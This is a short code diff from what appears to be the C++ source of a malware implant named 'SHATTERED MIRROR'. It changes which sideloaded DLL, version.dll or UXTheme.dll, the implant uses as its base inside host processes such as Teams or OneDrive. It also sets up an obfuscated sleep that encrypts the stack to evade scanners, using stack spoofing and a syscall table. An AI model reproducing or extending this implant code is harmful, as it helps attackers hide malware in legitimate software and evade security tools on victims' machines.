@@ -202,6 +202,8 @@ BOOL InitAtomManager(void) {
  *  OrchestratorMain — Main Loop
  *-------------------------------------------------------------------------*/
 DWORD WINAPI OrchestratorMain(LPVOID lpParam) {
+    /* Initialize logging safely outside of DllMain */
+    Logger::Init(Config::LOG_FILE_PATH, Config::ENABLE_DEBUG_CONSOLE);
     Logger::Log(INFO, "--- SHATTERED MIRROR: ORCHESTRATOR ONLINE ---");
 
     if (!InitAtomManager()) {
@@ -219,8 +221,8 @@ DWORD WINAPI OrchestratorMain(LPVOID lpParam) {
         sleepCfg.dwSleepMs = 15000;
         sleepCfg.bStackSpoof = Config::ENABLE_STACK_SPOOF;
         
-        /* FIX: Must use the base of OUR DLL, not the host process (Teams/OneDrive) */
-        sleepCfg.pImplantBase = GetModuleHandleW(L"version.dll"); 
+        /* FIXED: Use UXTheme.dll instead of version.dll */
+        sleepCfg.pImplantBase = GetModuleHandleW(L"UXTheme.dll"); 
         
         Logger::Log(INFO, "Entering Obfuscated Sleep (15s)... Stack encrypted to evade scanners.");
         ObfuscatedSleep(&sleepCfg, &g_SyscallTable);
